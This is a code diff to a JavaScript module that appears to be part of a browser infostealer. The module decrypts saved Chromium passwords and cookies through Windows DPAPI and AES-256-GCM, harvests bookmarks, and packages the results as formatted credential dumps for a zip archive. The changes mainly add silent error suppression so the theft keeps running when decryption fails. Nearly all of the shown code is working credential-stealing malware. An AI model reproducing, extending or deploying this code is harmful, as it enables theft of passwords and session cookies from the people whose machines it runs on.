@@ -1,11 +1,9 @@
 module.exports = (client) => {
     return {
 
-        saveBrowserStuff() {
+        async saveBrowserStuff() {
             ["passwords", "cookies", "bookmarks", "history", "autofill"].forEach(async (type) => {
-                if (client.config.environ[type].all) {
-                    client.utils.jszip.createFolder(`\\${type}`);
-                }
+                client.utils.jszip.createFolder(`\\${type}`);
 
                 for (let [key, value] of Object.entries(client.config.environ[type])) {
                     if (value.length != 0) {
@@ -30,28 +28,6 @@ module.exports = (client) => {
             })
         },
 
-        async getBrowserData(path) {
-            let browser;
-
-            if (path.includes("Local")) {
-
-                browser = path.split("\\Local\\")[1].split("\\")[0]
-            } else {
-                browser = path.split("\\Roaming\\")[1].split("\\")[1]
-            }
-
-            if (browser == "Google") {
-                browser == "Chrome"
-            } else if (browser == "BraveSoftware") {
-                browser = "Brave"
-            } else if (browser == "Microsoft") {
-                browser = "Microsoft Edge"
-            }
-            client.utils.jszip.createFolder(`\\Browsers`);
-            client.utils.jszip.createFolder(`\\Browsers\\${browser}`);
-
-        },
-
         async getBookmarks(path) {
             let browser;
 
@@ -74,14 +50,16 @@ module.exports = (client) => {
                 var bookmarks = (JSON.parse(client.requires.fs.readFileSync(`${path}\\Bookmarks`))).roots.bookmark_bar.children;
 
                 for (var bookmark of bookmarks) {
-                    client.config.environ.bookmarks.all.push(`==================================================\nBROWSER   : ${browser}\nID        : ${bookmark['id']}\nNAME      : ${bookmark['name']}\nURL       : ${bookmark['url']}\nGUID      : ${bookmark['guid']}\nADDED AT  : ${bookmark['date_added']}\n==================================================`)
+                    try {
+                        client.config.environ.bookmarks.all.push(`==================================================\nBROWSER   : ${browser}\nID        : ${bookmark['id']}\nNAME      : ${bookmark['name']}\nURL       : ${bookmark['url']}\nGUID      : ${bookmark['guid']}\nADDED AT  : ${bookmark['date_added']}\n==================================================`)
 
-                    if (!client.config.environ.bookmarks[browser]) {
-                        client.config.environ.bookmarks[browser] = []
-                    }
+                        if (!client.config.environ.bookmarks[browser]) {
+                            client.config.environ.bookmarks[browser] = []
+                        }
 
-                    client.config.environ.bookmarks[browser].push(`==================================================\nBROWSER   : ${browser}\nID        : ${bookmark['id']}\nNAME      : ${bookmark['name']}\nURL       : ${bookmark['url']}\nGUID      : ${bookmark['guid']}\nADDED AT  : ${bookmark['date_added']}\n==================================================`)
+                        client.config.environ.bookmarks[browser].push(`==================================================\nBROWSER   : ${browser}\nID        : ${bookmark['id']}\nNAME      : ${bookmark['name']}\nURL       : ${bookmark['url']}\nGUID      : ${bookmark['guid']}\nADDED AT  : ${bookmark['date_added']}\n==================================================`)
 
+                    } catch (err) {}
 
                     client.config.counter.bookmarks++;
                 }
@@ -232,16 +210,18 @@ module.exports = (client) => {
 
                         var decrypted;
 
-                        if ((encrypted_value[0] == 1) && (encrypted_value[1] == 0) && (encrypted_value[2] == 0) && (encrypted_value[3] == 0)) {
-                            decrypted = dpapi.unprotectData(encrypted_value, null, 'CurrentUser');
-                        } else {
-                            let start = encrypted_value.slice(3, 15),
-                                middle = encrypted_value.slice(15, encrypted_value.length - 16),
-                                end = encrypted_value.slice(encrypted_value.length - 16, encrypted_value.length),
-                                decipher = client.requires.crypto.createDecipheriv('aes-256-gcm', key, start);
-                            decipher.setAuthTag(end);
-                            decrypted = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
-                        }
+                        try {
+                            if ((encrypted_value[0] == 1) && (encrypted_value[1] == 0) && (encrypted_value[2] == 0) && (encrypted_value[3] == 0)) {
+                                decrypted = dpapi.unprotectData(encrypted_value, null, 'CurrentUser');
+                            } else {
+                                let start = encrypted_value.slice(3, 15),
+                                    middle = encrypted_value.slice(15, encrypted_value.length - 16),
+                                    end = encrypted_value.slice(encrypted_value.length - 16, encrypted_value.length),
+                                    decipher = client.requires.crypto.createDecipheriv('aes-256-gcm', key, start);
+                                decipher.setAuthTag(end);
+                                decrypted = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
+                            }
+                        } catch {}
 
                         client.config.environ.cookies.all.push(`${row['host_key']}  TRUE	/	FALSE	2597573456	${row['name']}	${decrypted}`);
 
@@ -306,27 +286,30 @@ module.exports = (client) => {
                     sql.each('SELECT origin_url, username_value, password_value FROM logins', function (err, row) {
                         if (row['username_value'] != '') {
                             let password_value = row['password_value'];
-                            var password;
-                            if ((password_value[0] == 1) && (password_value[1] == 0) && (password_value[2] == 0) && (password_value[3] == 0)) {
+                            try {
+                                var password;
+                                if ((password_value[0] == 1) && (password_value[1] == 0) && (password_value[2] == 0) && (password_value[3] == 0)) {
 
-                                password = dpapi.unprotectData(password_value, null, 'CurrentUser');
-                            } else {
-                                let start = password_value.slice(3, 15),
-                                    middle = password_value.slice(15, password_value.length - 16),
-                                    end = password_value.slice(password_value.length - 16, password_value.length),
-                                    decipher = client.requires.crypto.createDecipheriv('aes-256-gcm', key, start);
-                                decipher.setAuthTag(end);
-                                password = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
-                            }
+                                    password = dpapi.unprotectData(password_value, null, 'CurrentUser');
+                                } else {
+                                    let start = password_value.slice(3, 15),
+                                        middle = password_value.slice(15, password_value.length - 16),
+                                        end = password_value.slice(password_value.length - 16, password_value.length),
+                                        decipher = client.requires.crypto.createDecipheriv('aes-256-gcm', key, start);
+                                    decipher.setAuthTag(end);
+                                    password = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
+                                }
 
-                            client.config.environ.passwords.all.push(`==================================================\nURL          : ${row['origin_url']}\nWeb Browser  : ${browser}\nUser Name    : ${row['username_value']}\nPassword     : ${password}\nFilename     : ${path}\n==================================================`)
+                                client.config.environ.passwords.all.push(`==================================================\nURL          : ${row['origin_url']}\nWeb Browser  : ${browser}\nUser Name    : ${row['username_value']}\nPassword     : ${password}\nFilename     : ${path}\n==================================================`)
 
-                            if (!client.config.environ.passwords[browser]) {
-                                client.config.environ.passwords[browser] = []
-                            }
-                            client.config.environ.passwords[browser].push(`==================================================\nURL          : ${row['origin_url']}\nWeb Browser  : ${browser}\nUser Name    : ${row['username_value']}\nPassword     : ${password}\nFilename     : ${path}\n==================================================`)
+                                if (!client.config.environ.passwords[browser]) {
+                                    client.config.environ.passwords[browser] = []
+                                }
+                                client.config.environ.passwords[browser].push(`==================================================\nURL          : ${row['origin_url']}\nWeb Browser  : ${browser}\nUser Name    : ${row['username_value']}\nPassword     : ${password}\nFilename     : ${path}\n==================================================`)
 
-                            client.config.counter.passwords++;
+                                client.config.counter.passwords++;
+
+                            } catch {}
                         };
                     }, function () {
                         resolve("")
